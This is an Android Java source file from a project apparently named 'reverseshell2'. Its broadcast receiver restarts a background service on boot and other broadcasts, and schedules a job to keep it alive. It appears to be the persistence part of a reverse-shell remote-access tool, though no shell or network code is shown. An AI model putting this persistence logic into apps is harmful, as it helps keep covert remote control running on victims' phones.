package com.example.reverseshell2;

import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import androidx.core.content.ContextCompat;

public class broadcastReciever extends BroadcastReceiver {

    static String TAG = "broadcastRecieverClass";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i(TAG, "Broadcast received: " + intent.getAction());

        if (isMyServiceRunning(context)) {
            Log.v(TAG, "Service is already running");
        } else {
            Log.v(TAG, "Starting service after broadcast");
            
            // Handle different Android versions appropriately
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // For Oreo and above, start as foreground service
                Intent serviceIntent = new Intent(context, mainService.class);
                ContextCompat.startForegroundService(context, serviceIntent);
            } else {
                // For pre-Oreo, start as regular service
                Intent serviceIntent = new Intent(context, mainService.class);
                context.startService(serviceIntent);
            }
        }

        // For boot completed events, ensure JobScheduler is set up on supported devices
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) 
                && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            new functions(null).jobScheduler(context);
        }
    }

    private boolean isMyServiceRunning(Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        
        // Handle potential security restrictions in newer Android versions
        try {
            for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
                if (mainService.class.getName().equals(service.service.getClassName())) {
                    return true;
                }
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Security exception checking service status: " + e.getMessage());
            // If we can't check, assume it's not running to be safe
            return false;
        }
        
        return false;
    }
}
